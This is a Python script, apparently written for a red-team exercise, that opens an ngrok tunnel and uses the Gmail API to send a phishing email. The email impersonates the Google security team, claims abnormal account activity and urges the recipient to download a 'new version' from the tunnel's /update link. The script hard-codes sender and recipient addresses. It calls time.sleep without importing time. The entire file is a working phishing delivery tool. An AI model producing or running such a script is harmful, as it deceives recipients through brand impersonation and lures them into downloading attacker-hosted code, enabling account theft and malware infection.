import subprocess
import requests
import json
import os.path
import base64
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from email.mime.text import MIMEText

# 如果修改範圍，需刪除 token.json
SCOPES = ['https://www.googleapis.com/auth/gmail.send']

def gmail_authenticate():
    creds = None
    # token.json 是用來保存使用者授權的存取權憑證
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    # 若沒有有效的憑證，或者憑證失效，則要求使用者授權
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # 保存憑證
        with open('token.json', 'w') as token:
            token.write(creds.to_json())
    return creds

def start_ngrok():
    # 啟動 ngrok 隧道並獲取 HTTP URL
    ngrok_process = subprocess.Popen(['ngrok', 'http', '5000'], stdout=subprocess.PIPE)
    
    # 獲取 ngrok 狀態的 API URL
    ngrok_api_url = "http://localhost:4040/api/tunnels"
    while True:
        try:
            response = requests.get(ngrok_api_url)
            if response.status_code == 200:
                data = json.loads(response.text)
                tunnel_url = data['tunnels'][0]['public_url']
                print(f"Ngrok URL: {tunnel_url}")
                return tunnel_url
        except Exception as e:
            print(f"Error fetching ngrok URL: {e}")
        time.sleep(2)

def send_phishing_email(ngrok_url):
    creds = gmail_authenticate()
    service = build('gmail', 'v1', credentials=creds)
    
    # 網絡釣魚郵件內文
    html = f"""\
        <html>
        <body>
            <p>尊敬的使用者，<br>
            您的帳戶存在異常活動，為了確保您的帳戶安全，請立即點擊以下連結下載我們的最新版本服務：<br>
            <a href="{ngrok_url}/update">下載新版服務</a>
            </p>
            <br>
            感謝您的合作，<br>
            Google 安全小組<br>
        </body>
        </html>
        """

    # message = MIMEText(text, "plain")
    message = MIMEText(html, "html")
    message['to'] = "hellooliver1717@gmail.com"
    message['from'] = "redteam832@gmail.com"
    message['subject'] = "重要更新通知"
    
    # Gmail API 要求使用 base64 編碼郵件
    raw = base64.urlsafe_b64encode(message.as_bytes()).decode()
    body = {'raw': raw}

    try:
        message = service.users().messages().send(userId="me", body=body).execute()
        print(f'郵件已發送，ID: {message["id"]}')
    except Exception as e:
        print(f'發送失敗: {e}')

# 主流程
ngrok_url = start_ngrok()  # 啟動 ngrok 並獲取 URL
# print(f"Current URL: {ngrok_url}")
send_phishing_email(ngrok_url) # 傳遞 URL 並發送郵件
